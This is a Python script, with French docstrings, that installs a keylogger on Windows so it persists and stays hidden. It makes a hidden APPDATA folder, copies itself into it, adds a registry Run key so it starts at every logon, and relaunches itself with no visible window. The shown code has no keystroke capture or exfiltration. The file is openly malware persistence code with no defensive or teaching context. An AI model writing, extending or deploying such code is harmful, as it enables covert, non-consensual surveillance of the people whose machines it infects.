import os
import shutil
import sys
import subprocess
import winreg


SCRIPT_NAME = "keylogger.py"
HIDDEN_DIR = os.path.join(os.getenv("APPDATA"), "Keylogger")
SCRIPT_PATH = os.path.join(HIDDEN_DIR, SCRIPT_NAME)

def create_hidden_directory():
    """Crée un dossier caché pour stocker le keylogger."""
    if not os.path.exists(HIDDEN_DIR):
        os.makedirs(HIDDEN_DIR)
        subprocess.run(["attrib", "+h", HIDDEN_DIR])  

def copy_script():
    """Copie le keylogger dans le dossier caché."""
    if not os.path.exists(SCRIPT_PATH):
        shutil.copy(sys.argv[0], SCRIPT_PATH)

def add_to_startup():
    """Ajoute une clé au registre pour exécuter le keylogger à la connexion."""
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
        winreg.SetValueEx(reg_key, "Keylogger", 0, winreg.REG_SZ, f'python "{SCRIPT_PATH}"')

def run_in_background():
    """Exécute le keylogger en arrière-plan."""
    subprocess.Popen(["python", SCRIPT_PATH], creationflags=subprocess.CREATE_NO_WINDOW)

def run():
    """Exécute le keylogger"""
    subprocess.Popen(["python", SCRIPT_PATH], creationflags=subprocess.CREATE_NEW_CONSOLE)

if __name__ == "__main__":
    create_hidden_directory()
    copy_script()
    add_to_startup()
    run_in_background()
